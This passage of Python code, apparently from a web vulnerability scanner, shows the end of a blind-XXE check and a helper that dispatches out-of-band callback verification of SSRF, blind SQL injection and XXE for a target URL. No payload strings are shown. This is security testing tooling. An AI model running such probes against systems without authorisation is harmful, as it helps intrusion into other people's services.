            return VerificationResult(
                vuln_type="XML External Entity (Blind XXE)",
                payload=xxe_payload[:100] + "...",
                url=url,
                is_vulnerable=True,
                confidence="high",
                evidence=f"OOB回调确认: {len(interactions)}次交互",
                response_time=0,
                response_code=200,
                response_length=0,
                verification_method="oob_callback",
                recommendation="严重漏洞! 禁用外部实体解析"
            )
        
        return VerificationResult(
            vuln_type="XXE",
            payload=xxe_payload[:50] + "...",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No OOB interaction detected",
            response_time=0,
            response_code=0,
            response_length=0,
            verification_method="oob_callback"
        )


def verify_with_oob(url: str, param: str, vuln_type: str) -> Dict:
    """
    便捷函数: 使用OOB验证漏洞
    
    Args:
        url: 目标URL
        param: 参数名
        vuln_type: 漏洞类型 (ssrf/sqli/xxe)
        
    Returns:
        验证结果字典
    """
    verifier = OOBIntegratedVerifier()
    
    if vuln_type.lower() == "ssrf":
        result = verifier.verify_blind_ssrf_with_oob(url, param)
    elif vuln_type.lower() in ["sqli", "sql"]:
        result = verifier.verify_blind_sqli_with_oob(url, param)
    elif vuln_type.lower() == "xxe":
        result = verifier.verify_blind_xxe_with_oob(url)
    else:
        return {"error": f"Unsupported vuln type for OOB: {vuln_type}"}
    
    return {
        "vuln_type": result.vuln_type,
        "url": result.url,
        "payload": result.payload,
        "is_vulnerable": result.is_vulnerable,
        "confidence": result.confidence,
        "evidence": result.evidence,
        "verification_method": result.verification_method,
        "recommendation": result.recommendation
    }
